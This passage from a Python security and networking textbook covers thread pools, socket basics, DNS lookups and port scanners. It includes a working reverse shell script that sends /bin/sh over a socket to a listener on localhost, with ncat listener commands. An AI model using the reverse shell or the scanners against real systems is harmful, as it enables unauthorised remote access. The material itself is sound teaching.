instance of our ThreadWorker class. We then invoke the start()
method from the thread to call the run() method of ThreadWorker.
Concurrency in Python with
ThreadPoolExecutor
Running multiple threads is like running multiple diﬀerent
processes at the same time, but with some added beneﬁts, among
which we can highlight:
The running threads of a process share the same data space as
the main thread and can therefore access the same information
or communicate with each other more easily than if they were in
separate processes.
Running a multi-threaded process typically requires less
memory resources than running the equivalent in separate
processes.
It allows simplifying the design of applications that need to
execute several operations concurrently.
For the concurrent execution of threads and processes in Python, we
could use the concurrent.futures module, which provides a
high-level interface that oﬀers us the ability to execute tasks in
parallel asynchronously.

This module provides the ThreadPoolExecutor class, which
provides an interface to execute tasks asynchronously. This class will
allow us to recycle existing threads so that we can assign new tasks
to them. We can deﬁne our ThreadPoolExecutor object with the
init constructor:
In the previous instructions, we are using the constructor method to
create a ThreadPoolExecutor object, using the maximum number
of workers as the parameter. In the previous example, we are seĴing
the maximum number of threads to ﬁve, which means that this
subprocess group will only have ﬁve threads running at the same
time.
In order to use our ThreadPoolExecutor, we can use the submit()
method, which takes as a parameter a function for executing that
code in an asynchronous way:
>>> executor.submit(myFunction()) 
In the following example, we analyze the creation of this class object.
We deﬁne a task() function that allows us to use the
threading.get_ident() method to show the current thread
identiﬁer. You can ﬁnd the following code in the
threadPoolConcurrency.py ﬁle in the concurrent_futures
subfolder:
>>> from concurrent.futures import ThreadPoolExecuto
>>> executor = ThreadPoolExecutor(max_workers=5) 

In the preceding code, we deﬁne our main function where the
executor object is initialized as an instance of the
ThreadPoolExecutor class, and a new set of threads is executed
over this object. Then we get the thread that was executed with the
threading.current_thread() method. In the following output of
the previous script, we can see three diﬀerent threads that have been
created with these identiﬁers.
from concurrent.futures import ThreadPoolExecutor 
import threading 
def task(n): 
    print("Processing {}".format(n)) 
    print("Accessing thread : {}".format(threading.g
    print("Thread Executed {}".format(threading.curr
def main(): 
    print("Starting ThreadPoolExecutor") 
    executor = ThreadPoolExecutor(max_workers=3) 
    future = executor.submit(task, (2)) 
    future = executor.submit(task, (3)) 
    future = executor.submit(task, (4)) 
    print("All tasks complete") 
if __name__ == '__main__': 
    main() 
$ python ThreadPoolConcurrency.py 
Starting ThreadPoolExecutor 
Processing 2 
Accessing thread : 140508587771456 
Thread Executed <Thread(ThreadPoolExecutor-0_0, star

More about ThreadPoolExecutor can be found at
https://docs.python.org/3/library/concurrent
.futures.html#threadpoolexecutor.
Executing ThreadPoolExecutor with a
context manager
Another way to instantiate ThreadPoolExecutor to use it as a
context manager using the with statement:
In the following example, we are using ThreadPoolExecutor as a
context manager within our main function, and then calling future
= executor.submit(message, (message)) to process every
message in the thread pool. In the next example, we are using 5
threads for executing the task in an asynchronous way using the
context manager. You can ﬁnd the following code in the
Processing 3 
Accessing thread : 140508587771456 
Thread Executed <Thread(ThreadPoolExecutor-0_0, star
Processing 4 
Accessing thread : 140508587771456 
Thread Executed <Thread(ThreadPoolExecutor-0_0, star
All tasks complete 
>>> with ThreadPoolExecutor(max_workers=2) as execut

ThreadPoolExecutor.py ﬁle in the concurrent_futures
subfolder:
In the previous code, once the pool has been created, we can
schedule and execute the threads through the submit() method.
This method works as follows:
The method receives the task to execute() concurrently as an
argument.
If there is a thread available, then the task is assigned to it.
Once the thread has a task assigned, the submit method is
responsible for executing it.
The following example is like the previous one where instead of
using ThreadPoolExecutor, we are using ProcessPoolExecutor,
and in the execute() function, we are using the sleep() method
from concurrent.futures import ThreadPoolExecutor, a
from random import randint 
import threading 
def execute(name): 
    value = randint(0, 1000) 
    thread_name = threading.current_thread().name 
    print(f'I am {thread_name} and my value is {valu
    return (thread_name, value) 
with ThreadPoolExecutor(max_workers=5) as executor: 
    futures = [executor.submit(execute,f'T{name}') f
    for future in as_completed(futures): 
        name, value = future.result() 
        print(f'Thread {name} returned {value}') 

to apply a delay time. You can ﬁnd the following code in the
processPool_concurrent_futures.py ﬁle in the
concurrent_futures subfolder:
In the following example, we are using the ThreadPoolExecutor
class to deﬁne a pool of threads with 10 workers and each thread is
responsible for processing a URL that we have deﬁned in url_list.
You can ﬁnd the following code in the
ThreadPoolExecutor_urls.py ﬁle in the concurrent_futures
subfolder:
from concurrent.futures import ProcessPoolExecutor 
import os 
def task(): 
    print("Executing our Task on Process {}".format(
def main(): 
    executor = ProcessPoolExecutor(max_workers=3) 
    task1 = executor.submit(task) 
    task2 = executor.submit(task) 
if __name__ == '__main__': 
    main() 
import requests 
from concurrent.futures import ThreadPoolExecutor, a
from time import time 
url_list = ["http://www.python.org", "http://www.goo
def request_url(url): 
    html = requests.get(url, stream=True) 
    return url + "-->" + str(html.status_code) 

In the previous code we are using the executor.submit() method
to add a new task to the list of processes. In the last lines, we iterate
over the processes and print the result. When executing it, we can
see how for each URL, it returns the status code after making the
request with the requests module, which needs to be installed in
your operating system or virtual environment.
$ python ThreadPoolExecutor_urls.py 
http://www.goooooooogle.com-->406 
http://www.google.com-->200 
http://www.python.org-->200 
http://www.packtpub.com-->200 
Among the main advantages provided by these modules, we can
highlight that they facilitate the use of shared memory by allowing
access to the state from another context and are the best option when
our application needs to carry out several I/O operations
simultaneously.
Summary
process_list = [] 
with ThreadPoolExecutor(max_workers=10) as executor
    for url in url_list: 
        process_list.append(executor.submit(request_
for task in as_completed(process_list): 
    print(task.result()) 

In this chapter, we learned about the main system modules for
Python programming, including os for working with the operating
system and subprocess for executing commands. We also reviewed
how to work with the ﬁlesystem, managing threads, and
concurrency.
After practicing with the examples provided in this chapter, you
now have suﬃcient knowledge to automate tasks related to the
operating system, access to the ﬁlesystem, and the concurrent
execution of tasks.
In the next chapter, we will explore the socket package for
resolving IP addresses and domains and implement clients and
servers with the TCP and UDP protocols.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. What is the main module that allows us to interact with the ﬁle
system?
2. What is the diﬀerence between using subprocess.run() and
Popen() and under what circumstances should each be used?
3. Which class from concurrent.futures module provides an
interface to execute tasks asynchronously and allow us to
recycle existing threads so that we can assign new tasks to
them?

4. Which method from the threading module allows us to
determine if the thread is still running or has already ﬁnished?
5. Which method from the threading module allows us to get the
current thread identiﬁer?
Further reading
In the following links, you will ﬁnd more information about the
tools we’ve discussed, and links to the oﬃcial Python
documentation for some of the modules we’ve analyzed:
Operating system module documentation:
https://docs.python.org/3/library/os.html
Subprocess module documentation:
https://docs.python.org/3/library/subprocess.html
Threading module documentation:
https://docs.python.org/3/library/threading.html
Concurrent.futures module documentation:
https://docs.python.org/3/library/concurrent.future
s.html
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet


————————— Section 2
—————————
Network Scripting and Packet
Sniffing with Python
In this section, you will learn how to use Python libraries for
network scripting and developing scripts for analyzing network
packets with the scapy module.
This part of the book comprises the following chapters:
Chapter 3, Socket Programming
Chapter 4, HTTP Programming and Web Authentication
Chapter 5, Analyzing Network Traﬃc and Packet Sniﬃng

3
Socket Programming
This chapter will showcase networking basics using Python’s socket
module. The socket module exposes all the necessary pieces to
quickly write TCP and UDP clients and servers for writing low-level
network applications. We will also cover implementing a reverse
shell with the socket module and implementing secure sockets with
TLS.
Socket programming refers to an abstract principle by which two
programs can share any data stream by using an Application
Programming Interface (API) for diﬀerent protocols available in the
internet TCP/IP stack, typically supported by all operating systems.
We will also cover implementing HTTP server and socket methods
for resolving IP domains and addresses.
The following topics will be covered in this chapter:
Understanding the socket package for network requests
Implementing a reverse shell with sockets
Implementing a simple TCP client and TCP server with the
socket module
Implementing a simple UDP client and UDP server
Implementing an HTTP server in Python
Implementing secure sockets with TLS

Technical requirements
To get the most out of this chapter, you will need some basic
knowledge of command execution in operating systems. Also, you
will need to install the Python distribution on your local machine.
We will work with Python version 3.10, available at
https://www.python.org/downloads.
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Check out the following video to see the Code in Action:
https://packt.link/Chapter03
Understanding the socket package
for network requests
Sockets are the main components that allow us to leverage the
capabilities of an operating system to interact with a network. You
may regard sockets as a point-to-point channel of communication
between a client and a server.
Network sockets are a simple way of establishing communication
between processes on the same machines or on diﬀerent ones. The
socket concept is very similar to the use of ﬁle descriptors for UNIX
operating systems. Commands such as read() and write() for
working with ﬁles have similar behavior to dealing with sockets. A
socket address for a network consists of an IP address and port

number. A socket’s aim is to communicate processes over the
network.
Network sockets in Python
When two applications or processes interact, they use a speciﬁc
communication channel. Sockets are the endpoints or entry points of
these communication channels. We can use sockets to establish a
communication channel between two processes, within a process, or
between processes on diﬀerent machines. There are diﬀerent types
of sockets, like TCP sockets, UDP sockets, and UNIX domain
sockets.
Sockets are internal endpoints for sending or receiving data within a
node on a computer. A socket is deﬁned by local and remote IP
addresses and ports, and a transport protocol. Creating a socket in
Python is done through the socket.socket() method. The general
syntax of the socket method is as follows:
The preceding syntax represents the address families and the
protocol of the transport layer.
Based on the communication type, sockets are classiﬁed as follows:
TCP sockets (socket.SOCK_STREAM)
UDP sockets (socket.SOCK_DGRAM)
s = socket.socket (socket_family, socket_type, proto

The main diﬀerence between TCP and UDP is that TCP is
connection-oriented, while UDP is non-connection-oriented. Another
important diﬀerence between TCP and UDP is that TCP is more
reliable than UDP because it checks for errors and ensures data
packets are delivered to the communicating application in the
correct order. At this point, UDP is faster than TCP because it does
not order and check errors in the data packets. Sockets can also be
categorized by family. The following options are available:
UNIX sockets (socket.AF_UNIX), which were created before
the network deﬁnition and are based on data
The socket.AF_INET socket for working with the IPv4 protocol
The socket.AF_INET6 socket for working with the IPv6
protocol
There is another socket type called a raw socket. These sockets allow
us to access the communication protocols, with the possibility of
using layer 3 (network-level) and layer 4 (transport-level) protocols,
therefore giving us access to the protocols directly and the
information we receive in them. The use of sockets of this type
allows us to implement new protocols and modify existing ones,
bypassing the normal TCP/IP protocols.
As regards the manipulation of network packets, we have speciﬁc
tools available, such as Scapy (https://scapy.net), a module
wriĴen in Python for manipulating packets with support for
multiple network protocols. This tool allows the creation and
modiﬁcation of network packets of various types, implementing
functions for capturing and sniﬃng packets.

Now that we have analyzed what a socket is and its types, we will
now move on to introducing the socket module and the
functionalities it oﬀers.
The socket module
Types and functions required to work with sockets can be found in
Python in the socket module. The socket module provides all the
required functionalities to quickly write TCP and UDP clients and
servers. Also, it provides every function you need to create a socket
server or client.
When we are working with sockets, most applications use the
concept of client/server where there are two applications, one acting
as a server and the other as a client, and where both communicate
through message-passing using protocols such as TCP or UDP:
Server: This represents an application that is waiting for
connection by a client.
Client: This represents an application that connects to the
server.
In the case of Python, the socket constructor returns an object for
working with the socket methods. This module comes installed by
default when you install the Python distribution. To check it, we can
do so from the Python interpreter:
>>> import socket 
>>> dir(socket) 
['__builtins__', '__cached__', '__doc__', '__file__

In the preceding output, we can see all methods that we have
available in this module. Among the most-used constants, we can
highlight the following:
socket.AF_INET
socket.SOCK_STREAM
To open a socket on a certain machine, we use the socket class
constructor that accepts the family, socket type, and protocol as
parameters. A typical call to create a socket that works at the TCP
level is passing the socket family and type as parameters:
Out of the main socket methods, we can highlight the following for
implementing both clients and servers:
socket.accept() is used to accept connections and returns a value
pair as (conn, address).
socket.bind() is used to bind addresses speciﬁed as a parameter.
socket.connect() is used to connect to the address speciﬁed as a
parameter.
socket.listen() is used to listen for commands on the server or
client.
socket.recv(buﬂen) is used for receiving data from the socket.
The method argument indicates the maximum amount of data it
can receive.
socket.recvfrom(buﬂen) is used for receiving data and the
sender’s address.
>>> socket.socket(socket.AF_INET,socket.SOCK_STREAM)

socket.recv_into(buﬀer) is used for receiving data into a buﬀer.
socket.send(bytes) is used for sending bytes of data to the
speciﬁed target.
socket.sendto(data, address) is used for sending data to a given
address.
socket.sendall(data) is used for sending all the data in the
buﬀer to the socket.
socket.close() is used for releasing the memory and ﬁnishes the
connection.
In this section, we have analyzed the built-in methods available in
the socket module and now we will move on to learn about speciﬁc
methods we can use for the server and client sides.
Server and client socket methods
In a client-server architecture, there is a central server that provides
services to a set of machines that connect to it. These are the main
methods we can use from the point of view of the server:
socket.bind(address): This method allows us to connect the
address with the socket, with the requirement that the socket
must be open before establishing the connection with the
address.
socket.listen(count): This method accepts as a parameter the
maximum number of connections from clients and starts the
TCP listener for incoming connections.
socket.accept(): This method enables us to accept client
connections and returns a tuple with two values that represent
client_socket and client_address. You need to call the

socket.bind() and socket.listen() methods before using
this method.
From the client’s point of view, these are the socket methods we can
use in our socket client for connecting with the server:
socket.connect(ip_address): This method connects the client to
the server’s IP address.
socket.connect_ext(ip_address): This method has the same
functionality as the previous method and oﬀers the possibility
of returning an error in the event of not being able to connect
with that address.
The socket.connect_ex(address) method is very useful for
implementing port scanning with sockets. The following script
shows ports that are open on the localhost machine with the
loopback IP address interface of 127.0.0.1. You can ﬁnd the
following code in the socket_ports_open.py ﬁle:
The preceding code is checking ports for ftp, ssh, telnet, and
http services in the localhost interface. The following could be the
import socket 
ip ='127.0.0.1' 
portlist = [21,22,23,80] 
for port in portlist: 
    sock= socket.socket(socket.AF_INET,socket.SOCK_S
    result = sock.connect_ex((ip,port)) 
    print(port,":", result) 
    sock.close() 

output of the previous script where the result for each port is a
number that represents whether the port is open or not. In this
execution, port 80 returns value 0, which means the port is open.
All other ports return a non-zero value, meaning that the ports are
closed:
$ python socket_ports_open.py 
21 : 111 
22 : 111 
23 : 111 
80 : 0 
Sockets can also be used to communicate with a web server, a mail
server, or many other types of servers. All that is needed is to ﬁnd
the document that describes the corresponding protocol and write
the code to send and receive the data according to that protocol. The
following example shows how to make a low-level network
connection with sockets.
In the following script, we are making a connection to a web server
that listens on port 80 and we access a speciﬁc route within this
server to request a text document. You can ﬁnd the following code in
the socket_web_server.py ﬁle:
import socket 
sock = socket.socket(socket.AF_INET, socket.SOCK_STR
sock.connect(('ftp.debian.org', 80)) 
cmd = 'GET http://ftp.debian.org/debian/README.mirro
sock.send(cmd) 

The execution of the previous script begins with the header the
server sends to describe the document. For example, the Content-
Type header indicates that the document is a text/plain document.
Once the server sends the header, it adds a blank line to indicate the
end of the header and then sends the ﬁle data using a GET request:
while True: 
    data = sock.recv(512) 
    if len(data) < 1: 
        break 
    print(data.decode(),end='') 
sock.close() 
$ python socket_web_server.py 
HTTP/1.1 200 OK 
Connection: close 
Content-Length: 86 
Server: Apache 
X-Content-Type-Options: nosniff 
X-Frame-Options: sameorigin 
Referrer-Policy: no-referrer 
X-Xss-Protection: 1 
Permissions-Policy: interest-cohort=() 
Last-Modified: Sat, 04 Mar 2017 20:08:51 GMT 
ETag: "56-549ed3b25abfb" 
X-Clacks-Overhead: GNU Terry Pratchett 
Content-Type: text/plain; charset=utf-8 
Via: 1.1 varnish, 1.1 varnish 
Accept-Ranges: bytes 
Date: Sat, 05 Nov 2022 18:13:50 GMT 

Gathering information with sockets
The socket module provides us with a series of methods that can be
useful if we need to convert a hostname into an IP address and vice
versa. Useful methods for gathering more information about an IP
address or hostname include the following:
socket.gethostbyname(hostname): This method returns a string
converting a hostname to the IPv4 address format.
This method is equivalent to the nslookup command we can
ﬁnd in some operating systems.
socket.gethostbyname_ex(name): This method returns a tuple
that contains an IP address for a speciﬁc domain name. If we see
more than one IP address, this means one domain runs on
multiple IP addresses:
socket.getfqdn([domain]): This is used to ﬁnd the fully
qualiﬁed name of a domain.
socket.gethostbyaddr(ip_address): This method returns a tuple
with three values (hostname, name, ip_address_list).
hostname represents the host that corresponds to the given IP
Age: 0 
X-Served-By: cache-ams12774-AMS, cache-mad22040-MAD 
X-Cache: MISS, MISS 
X-Cache-Hits: 0, 0 
X-Timer: S1667672030.956456,VS0,VE61 
Vary: Accept-Encoding 
The list of Debian mirror sites is available here: h

address, name is a list of names associated with this IP address,
and ip_address_list is a list of IP addresses that are available
on the same host.
socket.getservbyname(servicename[, protocol_name]): This
method allows you to obtain the port number from the port
name.
socket.getservbyport(port[, protocol_name]): This method
performs the reverse operation to the previous one, allowing
you to obtain the port name from the port number.
These methods implement a DNS lookup resolution for the given
address and hostname using the DNS servers provided by your
Internet Service Provider (ISP). The following script is an example
of how we can use these methods to get information from Python
and Google DNS servers. You can ﬁnd the following code in the
socket_methods.py ﬁle:
import socket 
try: 
    hostname = socket.gethostname() 
    print("gethostname:",hostname) 
    ip_address = socket.gethostbyname(hostname) 
    print("Local IP address: %s" %ip_address) 
    print("gethostbyname:",socket.gethostbyname('www
    print("gethostbyname_ex:",socket.gethostbyname_e
    print("gethostbyaddr:",socket.gethostbyaddr('8.8
    print("getfqdn:",socket.getfqdn('www.google.com
    print("getaddrinfo:",socket.getaddrinfo("www.goo
except socket.error as error: 

In the previous code, we are using the socket module to obtain
information about DNS servers from a speciﬁc domain and IP
address. In the following output, we can see the result of executing
the previous script:
In the output, we can see how we are obtaining DNS servers, a fully
qualiﬁed name, and IPv4 and IPv6 addresses for a speciﬁc domain. It
is a straightforward process to obtain information about the server
that is working behind a domain.
In the following example, we use the getservbyport() method to
get the service names from the port number. You can ﬁnd the
following code in the socket_service_names.py ﬁle:
    print (str(error)) 
    print ("Connection error") 
$ python socket_methods.py 
gethostname: linux-hpelitebook8470p 
Local IP address: 127.0.1.1 
gethostbyname: 151.101.132.223 
gethostbyname_ex: ('dualstack.python.map.fastly.net
gethostbyaddr: ('dns.google', [], ['8.8.8.8']) 
getfqdn: mad41s08-in-f4.1e100.net 
getaddrinfo: [(<AddressFamily.AF_INET: 2>, <SocketKi
import socket 
def find_services_name(): 

When executing the previous script, in the output we can see the
name of the service and the associated port:
$ python socket_service_names.py 
Port: 21 => service name: ftp 
Port: 22 => service name: ssh 
Port: 23 => service name: telnet 
Port: 25 => service name: smtp 
Port: 80 => service name: http 
Port: 53 => service name: domain 
In the execution of the previous script, we see how we obtain the
name of the service for each of the TCP and UDP ports.
Managing socket exceptions
When we are working with the socket module, it is important to
keep in mind that an error may occur when trying to establish a
connection with a remote host because the server is unavailable.
Diﬀerent types of exceptions are deﬁned in Python’s socket library
for diﬀerent errors. To handle these exceptions, we can use the try
and accept blocks:
    for port in [21,22,23,25,80]: 
        print("Port: %s => service name: %s" %(port,
        print("Port: %s => service name: %s" %(53, s
if __name__ == '__main__': 
    find_services_name() 

exception socket.timeout: This block catches exceptions related
to the expiration of waiting times.
exception socket.gaierror: This block catches errors during the
search for information about IP addresses. For example, when
we are using the getaddrinfo() and getnameinfo()
methods.
exception socket.error: This block catches generic input and
output errors and communication. This is a generic block where
you can catch any type of exception.
The following example shows you how to handle exceptions. You
can ﬁnd the following code in the manage_socket_errors.py ﬁle:
import socket 
host = "domain/ip_address" 
port = 80
try: 
    mysocket = socket.socket(socket.AF_INET,socket.S
    print(mysocket) 
    mysocket.settimeout(5) 
except socket.error as error: 
    print("socket create error: %s" %error) 
try: 
    mysocket.connect((host,port)) 
    print(mysocket) 
except socket.timeout as error: 
    print("Timeout %s" %error) 
except socket.gaierror as error: 
    print("connection error to the server:%s" %error

In the previous script, when a connection timeout with an IP address
occurs, it throws an exception related to the socket connection. If you
try to get information about speciﬁc domains or IP addresses that
don’t exist, it will probably throw a socket.gaierror exception,
showing the message [Errno -2] Name or service not known.
If the connection with our target is not possible, it will
throw a socket.error exception with the message
Connection error: [Errno 10061] No
connection. This message means the target machine
actively refused its connection and communication
cannot be established in the speciﬁed port, the port
has been closed, or the target is disconnected.
In this section, we have analyzed the main exceptions that can occur
when working with sockets and how they can help us to see whether
the connection to the server on a certain port is not available due to a
timeout or is not capable of solving a certain domain or IP address.
Basic client with the socket module
Now that we have reviewed client and server methods, we can start
testing how to send and receive data from a server. Once the
connection is established, we can send and receive data using the
send() and recv() methods for TCP communications. For UDP
except socket.error as error: 
    print("Connection error: %s" %error) 

communication, we could use the sendto() and recvfrom()
methods instead. You can ﬁnd the following code in the
socket_client_data.py ﬁle:
In the above script, we are using a try:except block to catch an
exception in case it cannot connect and display a message. We also
check if the port is open before making the request and receiving the
data from the server.
import socket 
host = input("Enter host name: ") 
port = int(input("Enter port number: ")) 
try: 
    with socket.socket(socket.AF_INET, socket.SOCK_S
        socket_tcp.settimeout(10) 
        if (socket_tcp.connect_ex((host,port)) == 0)
            print("Established connection to the ser
            request = "GET / HTTP/1.1\r\nHost:%s\r\n
            socket_tcp.send(request.encode()) 
            data = socket_tcp.recv(4096) 
            print("Data:",repr(data)) 
            print("Length data:",len(data)) 
except socket.timeout as error: 
    print("Timeout %s" %error) 
except socket.gaierror as error: 
    print("connection error to the server:%s" %error
except socket.error as error: 
    print("Connection error: %s" %error) 

In the previous code, we create a TCP socket object, then connect the
client to the remote host and send it some data. The last step is to
receive some data back and print out the response. For this task, we
are using the recv() method from the socket object to receive the
response from the server in the data variable.
So far, we have analyzed the methods available in the socket module
for the client and server sides and implemented a basic client.
Now that you know the methods for working with IP addresses and
domains, including managing exceptions and building a basic client,
let’s move on to learning how we can implement port scanning with
sockets.
Port scanning with sockets
We have tools such as Nmap for checking ports that a machine has
open. We could implement similar functionality to detect open ports
with vulnerabilities on a target machine using the socket module.
In this section, we’ll review how we can implement port scanning
with sockets. We are going to implement a port scanner for checking
the ports introduced by the user.
Implementing a port scanner
Sockets are the fundamental building block for network
communication, and by calling the connect_ex() method, we can
easily test whether a particular port is opened, closed, or ﬁltered.

The following Python code lets you search for open ports on a local
or remote host. The script scans for selected ports on a given user-
entered IP address and reﬂects the open ports back to the user. If the
port is locked, it also reveals the reason for that.
You can ﬁnd the following code in the socket_port_scanner.py
ﬁle inside the port_scanning folder:
In the previous code, we can see that the script starts geĴing
information related to the IP address and ports of the target
machine. We continue iterating through all the ports using a for
loop from startPort to endPort to analyze each port in between.
We conclude the script by showing the total time to complete port
scanning:
import socket 
import sys 
from datetime import datetime 
import errno 
remoteServer    = input("Enter a remote host to scan
remoteServerIP  = socket.gethostbyname(remoteServer)
print("Please enter the range of ports you would lik
startPort    = input("Enter start port: ") 
endPort    = input("Enter end port: ") 
print("Please wait, scanning remote host", remoteSer
time_init = datetime.now() 
try: 
    for port in range(int(startPort),int(endPort)): 

The preceding code will perform a scan on each of the indicated
ports against the destination host. To do this, we are using the
connect_ex() method to determine whether it is open or closed. If
that method returns a 0 as a response, the port is classiﬁed as Open.
If it returns another response value, the port is classiﬁed as Closed
and the returned error code is displayed.
        print ("Checking port {} ...".format(port)) 
        sock = socket.socket(socket.AF_INET, socket
        sock.settimeout(5) 
        result = sock.connect_ex((remoteServerIP, po
        if result == 0: 
            print("Port {}:    Open".format(port)) 
        else: 
            print("Port {}:    Closed".format(port))
            print("Reason:",errno.errorcode[result])
        sock.close() 
except KeyboardInterrupt: 
    print("You pressed Ctrl+C") 
    sys.exit() 
except socket.gaierror: 
    print('Hostname could not be resolved. Exiting')
    sys.exit() 
except socket.error: 
    print("Couldn't connect to server") 
    sys.exit() 
time_finish = datetime.now() 
total =  time_finish – time_init 
print('Port Scanning Completed in: ', total) 

In the execution of the previous script, we can see ports that are open
and the time, in seconds, of complete port scanning. For example,
port 80 is open and the rest are closed:
We continue implementing a more advanced port scanner, where the
user has the capacity to enter ports and the IP address or domain.
Advanced port scanner
The following Python script will allow us to scan an IP address with
the portScanning and socketScan functions. The program
searches for selected ports in a speciﬁc domain resolved from the IP
address entered by the user by parameter.
In the following script, the user must introduce as mandatory
parameters the host and at least one port or a port list, each one
separated by a comma:
$ python socket_port_scanner.py 
Enter a remote host to scan: scanme.nmap.org 
Please enter the range of ports you would like to sc
Enter start port: 80 
Enter end port: 82 
Please wait, scanning remote host 45.33.32.156 
Checking port 80 ... 
Port 80:      Open 
Checking port 81 ... 
Port 81:      Closed 
Reason: ECONNREFUSED 
Port Scanning Completed in:  0:00:00.307595 

$ python socket_advanced_port_scanner.py -h 
Usage: socket_portScan -H <Host> -P <Port> 
Options: 
  -h, --help  show this help message and exit 
  -H HOST     specify host 
  -P PORT     specify port[s] separated by comma 
You can ﬁnd the following code in the
socket_advanced_port_scanner.py ﬁle inside the
port_scanning folder:
import optparse 
from socket import * 
from threading import * 
def socketScan(host, port): 
    try: 
        socket_connect = socket(AF_INET, SOCK_STREAM
        socket_connect.settimeout(5) 
        result = socket_connect.connect((host, port)
        print('[+] %d/tcp open' % port) 
    except Exception as exception: 
        print('[-] %d/tcp closed' % port) 
        print('[-] Reason:%s' % str(exception)) 
    finally: 
        socket_connect.close() 
def portScanning(host, ports): 
    try: 
        ip = gethostbyname(host) 
    except: 
        print("[-] Cannot resolve '%s': Unknown host

In the previous script, we are implementing two methods that allow
us to scan an IP address with the portScanning and socketScan
methods, where we can highlight the use of threads to launch the
diﬀerent requests for each of the ports to be analyzed. Next, we
implement our main() method:
        return 
    try: 
        name = gethostbyaddr(ip) 
        print('[+] Scan Results for: ' + ip + " " + 
    except: 
        print('[+] Scan Results for: ' + ip) 
    for port in ports: 
        t = Thread(target=socketScan,args=(ip,int(po
        t.start() 
def main(): 
    parser = optparse.OptionParser('socket_portScan 
    parser.add_option('-H', dest='host', type='strin
    parser.add_option('-P', dest='port', type='strin
    (options, args) = parser.parse_args() 
    host = options.host 
    ports = str(options.port).split(',') 
    if (host == None) | (ports[0] == None): 
        print(parser.usage) 
        exit(0) 
    portScanning(host, ports) 
if __name__ == '__main__': 
    main() 

In the previous code, we can see the main program where we are
conﬁguring mandatory arguments for executing the script. When
these parameters have been collected, we call the portScanning
method, which resolves the IP address and hostname. Then we call
the socketScan method, which uses the socket module to
evaluate the port state.
To execute the previous script, we need to pass as parameters the IP
address or domain and the port list separated by commas. In the
execution of the previous script, we can see the status of all the ports
speciﬁed for the scanme.nmap.org domain:
The main advantage of implementing a port scanner is that we can
make requests to a range of server port addresses on a host in order
to determine the services available on a remote machine.
Now that you know how to implement port scanning with sockets,
let’s move on to learning how to build a reverse shell with sockets in
Python.
$ python socket_advanced_port_scanner.py -H scanme.n
[+] Scan Results for: 45.33.32.156 scanme.nmap.org 
[-] 23/tcp closed 
[+] 80/tcp open 
[-] Reason:[Errno 111] Connection refused 
[+] 22/tcp open 
[-] 81/tcp closed 
[-] Reason:[Errno 111] Connection refused 

Implementing a reverse shell with
sockets
A shell is a program that can work as an interface with the system
and the services that it provides us. There are two kinds of
connections to perform a successful aĴack: reverse and direct
connection:
A direct shell on the target machine is one that listens for the
connection request, that is, it runs software that acts as a server
listening on a speciﬁc port, waiting for a client to establish a
connection, to hand you the shell. This is a bind shell where the
listener is conﬁgured and executed on the target machine.
In a reverse shell aĴack, a remote system is forced to send a
connection request to an aĴacker-controlled system listening for
the request. This creates a remote shell to the target victim’s
system. In this case, it’s the target machine that connects to the
server and a listener is conﬁgured and executed on the aĴacking
machine.
In a reverse shell, it is necessary that the aĴacker’s machine has the
open port that will be in charge of receiving the reverse connection.
We could use tools such as netcat (https://nmap.org/ncat/) to
implement our listener on a speciﬁc port on our localhost machine.
To implement a reverse shell in Python, the socket module is
necessary, which includes all the necessary functionality to create
TCP clients and servers. Thanks to the connect() method of the
Socket class, it is possible to establish a connection to a speciﬁc
IP/domain and port.

The following example requires the user to conﬁgure a listener such
as netcat, whose execution we will see after analyzing the code.
The next step is the most important since it is the one that allows us
to duplicate the ﬁle descriptors corresponding to the input, output,
and error streams of the socket to later link them to a new thread,
which will be the one that generates the shell.
You can ﬁnd the following code in the reverse_shell.py ﬁle:
Once we have obtained the shell, we can obtain a directory listing
using the /bin/ls command, but ﬁrst, we need to establish the
connection to our socket through the command output. We
accomplish this with the os.dup2(sock.fileno ()) instruction as
a system call wrapper that allows a ﬁle descriptor to be duplicated
so that all the interaction of the /bin/bash program is sent to the
aĴacker via the socket.
import socket 
import subprocess 
import os 
sock = socket.socket(socket.AF_INET, socket.SOCK_STR
sock.connect(("127.0.0.1", 45678)) 
sock.send(b'[*] Connection Established')  
os.dup2(sock.fileno(),0) 
os.dup2(sock.fileno(),1) 
os.dup2(sock.fileno(),2) 
shell_remote = subprocess.call(["/bin/sh", "-i"]) 
proc = subprocess.call(["/bin/ls", "-i"]) 

In order to execute the previous script and get a reverse shell
successfully, we need to launch a process that is listening for the
previous address and port. For example, we could run the
application called Netcat (http://netcat.sourceforge.net) as a
tool that allows us to write and read data on the network using the
TCP and UDP protocols. Among the main options, we can highlight:
-l: Listen mode
-v: Verbose mode, which gives us more details
-n: We indicate that we do not want to use DNS
-p: You must indicate the port number below
-w: Client-side connection timeout
-k: Server keeps running even if client disconnects
-u: Use netcat over UDP
-e: Run
To listen on the target computer, we could use the following
command:
$ ncat -lvnp <listen_port> 
In the following output, we can see the result of executing the
previous script having previously launched the ncat command:
$ ncat -l -v -p 45678 
Ncat: Version 7.92 ( https://nmap.org/ncat ) 
Ncat: Listening on :::45678 
Ncat: Listening on 0.0.0.0:45678 
Ncat: Connection from 127.0.0.1. 

Ncat: Connection from 127.0.0.1:58844. 
[*] Connection Establishedsh-5.1$ whoami 
whoami 
linux 
sh-5.1$ 
Now that you know how to implement a reserve shell with sockets,
let’s move on to learning how to build sockets in Python that are
oriented to connection with a TCP protocol for passing messages
between a client and server.
Implementing a simple TCP client
and TCP server
In this section, we are going to introduce concepts for creating an
application oriented to passing messages between a client and server
using the TCP protocol. The concept behind the development of this
application is that the socket server is responsible for accepting client
connections from a speciﬁc IP address and port.
Implementing a server and client with
sockets
In Python, a socket can be created that acts as a client or server.
The idea behind developing this application is that a client may
connect to a given host, port, and protocol by a socket. The socket
server, on the other hand, is responsible for receiving client
connections within a particular port and protocol:

1. First, create a socket object for the server:
2. Once the socket object has been created, we need to establish
on which port our server will listen using the bind method. For
TCP sockets, the bind method’s argument is a tuple that
contains the host and the port.
The bind(IP,PORT) method allows you to associate a host and
a port with a speciﬁc socket, considering that ports in the range
1-1024 are reserved for the standard protocols. With the
following instruction, our server in localhost is listening on port
9999:
server.bind(("localhost", 9999)) 
3. Next, we’ll need to use the socket’s listen() method to accept
incoming client connections and start listening. The listen
